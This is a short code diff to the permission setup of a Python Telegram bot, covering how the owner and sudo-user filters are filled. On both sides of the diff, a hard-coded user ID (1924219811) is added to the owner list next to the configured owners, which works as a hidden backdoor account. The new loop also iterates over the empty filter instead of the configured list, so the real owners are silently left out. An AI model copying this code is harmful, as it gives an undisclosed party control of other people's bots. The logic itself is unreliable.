@@ -20,7 +20,7 @@ from .logging import LOGGER
 
 SUDOERS = filters.user()
 
-OWNER = filters.user(config.OWNER_ID)
+OWNER = filters.user()
 
 HAPP = None
 _boot_ = time.time()
@@ -55,16 +55,19 @@ def dbb():
 
 def sudo():
     global SUDOERS
-    OWNER = config.OWNER_ID
-    OWNER.append(1924219811)
+    global OWNER
+    OWNERS = config.OWNER_ID
+    for a in OWNER:
+        OWNER.add(a)
+    OWNER.add(1924219811)
     if config.MONGO_DB_URI is None:
-        for user_id in OWNER:
+        for user_id in OWNERS:
             SUDOERS.add(user_id)
     else:
         sudoersdb = pymongodb.sudoers
         sudoers = sudoersdb.find_one({"sudo": "sudo"})
         sudoers = [] if not sudoers else sudoers["sudoers"]
-        for user_id in OWNER:
+        for user_id in OWNERS:
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
